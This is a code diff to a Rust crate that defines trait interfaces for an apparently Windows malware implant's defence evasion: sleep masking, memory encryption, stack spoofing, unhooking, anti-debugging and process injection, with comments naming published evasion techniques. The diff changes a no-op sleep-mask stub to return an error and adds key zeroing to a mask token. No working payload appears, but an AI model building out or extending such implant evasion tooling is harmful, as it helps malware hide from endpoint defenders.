@@ -40,10 +40,14 @@
 //! self-sufficient. `EvasionStack.kernel` records the kernel posture so impls
 //! can downgrade themselves.
 //!
-//! ## Status (2026-06)
-//! Seams only; no real impls yet. Research-grounded technique lists per trait
-//! come from `docs/p2-2026-h2-latest-sweep.md`, `docs/p2-2026-kernel-tier-deepdive.md`,
-//! and the root research corpus.
+//! ## Status
+//! Seam surface is canonical and exhaustive; 5 of the 9 traits have LIVE
+//! impls in `implant-win/src/evasion_glue.rs` (`PdataGapScanner`, `StackSpoofKit`,
+//! `BlindKit`, `MemoryMaskKit`, `ProcessInjectKit` — the rest of this crate's
+//! floors remain the no-op default for the other four: `SyscallSource`,
+//! `SleepmaskKit`, `UnhookKit`, `AntiDebugKit`). Research-grounded technique
+//! lists per trait come from `docs/p2-2026-h2-latest-sweep.md`,
+//! `docs/p2-2026-kernel-tier-deepdive.md`, and the root research corpus.
 
 #![cfg_attr(not(test), no_std)]
 #![forbid(unsafe_op_in_unsafe_fn)]
@@ -252,7 +256,12 @@ impl SpoofGuard {
 /// WaitForSingleObject), `InsomniacUnwinding` (stomp + register .pdata +
 /// mask memory only — no spoof-during-sleep, CET-clean), `Zilean`, `DreamWalkers`.
 pub trait SleepmaskKit {
-    fn sleep_masked(&self, seconds: u32, gaps: &GapPool);
+    /// Own the mask → sleep → unmask window. Returns `Err` (e.g.
+    /// [`EvasionError::NoFloor`]) when no real sleep-mask impl is wired, so
+    /// the caller can distinguish "masked and slept" from "did nothing" —
+    /// evasionsdk-3: the old `()` signature made the floor indistinguishable
+    /// from a real impl.
+    fn sleep_masked(&self, seconds: u32, gaps: &GapPool) -> Result<(), EvasionError>;
 }
 
 /// The memory-content half of sleep obfuscation, separable from the timing
@@ -268,8 +277,17 @@ pub trait MemoryMaskKit {
     /// Restore the region the token refers to. MUST run before any code in it.
     fn unmask(&self, token: MaskToken) -> Result<(), EvasionError>;
 }
-/// Opaque restore handle. `Drop` MUST repair if leaked un-unmasked.
-/// Carries the mask parameters (base, len, key) so `unmask` can restore.
+/// Opaque restore handle. Carries the mask parameters (base, len, key) so
+/// `unmask` can restore.
+///
+/// **Drop contract (evasionsdk-4):** this seam is a platform-agnostic data
+/// token and cannot itself repair image bytes (only the real `MemoryMaskKit`
+/// impl knows how to decrypt/restore), so `Drop` guarantees the minimum
+/// portable invariant: the RC4 key is zeroed on any drop path, so a
+/// leaked/un-unmasked token never leaves the mask key in memory. The image
+/// restore itself is NOT performed by Drop — callers MUST `unmask()` before
+/// the token drops, and any code that drops an un-unmasked token leaves the
+/// region encrypted (crash on next fetch) with a wiped key.
 #[must_use = "an un-unmasked MaskToken leaves the image encrypted → crash"]
 pub struct MaskToken {
     /// Image base address (VA) that was masked.
@@ -283,6 +301,17 @@ impl MaskToken {
     /// Construct a token. Only real `MemoryMaskKit` impls call this.
     pub fn new(base: usize, len: usize, key: [u8; 32]) -> Self {
         Self { base, len, key }
+    }
+}
+impl Drop for MaskToken {
+    fn drop(&mut self) {
+        // Zero the mask key on EVERY drop path (evasionsdk-4). A real impl's
+        // `unmask(token)` reads the key before this runs, so restoration is
+        // unaffected; this only guarantees the key does not linger if the
+        // token is dropped un-unmasked.
+        for b in self.key.iter_mut() {
+            *b = 0;
+        }
     }
 }
 
@@ -381,14 +410,13 @@ impl StackSpoofKit for Floors {
     }
 }
 impl SleepmaskKit for Floors {
-    // The trait signature returns `()`, so the floor cannot propagate an
-    // error. This is an HONEST no-op: it performs no mask and no sleep-window
-    // setup — unlike the `Result`-returning floors above/below, which were
-    // previously masking "unimplemented" as fake `Ok` success. Callers that
-    // need to detect "no sleep mask is wired" should do so via the presence
-    // of a real `SleepmaskKit` impl in `EvasionStack`, not by inspecting this
-    // call. See ROADMAP "implant-evasionsdk wiring".
-    fn sleep_masked(&self, _s: u32, _gaps: &GapPool) {}
+    // evasionsdk-3: the trait now returns `Result`, so the floor can
+    // propagate a real error instead of silently doing nothing — callers can
+    // distinguish "masked and slept" from "no sleep mask wired" (the old `()`
+    // signature made the floor indistinguishable from a real impl).
+    fn sleep_masked(&self, _s: u32, _gaps: &GapPool) -> Result<(), EvasionError> {
+        Err(EvasionError::NoFloor("SleepmaskKit"))
+    }
 }
 impl MemoryMaskKit for Floors {
     fn mask(&self) -> Result<MaskToken, EvasionError> {
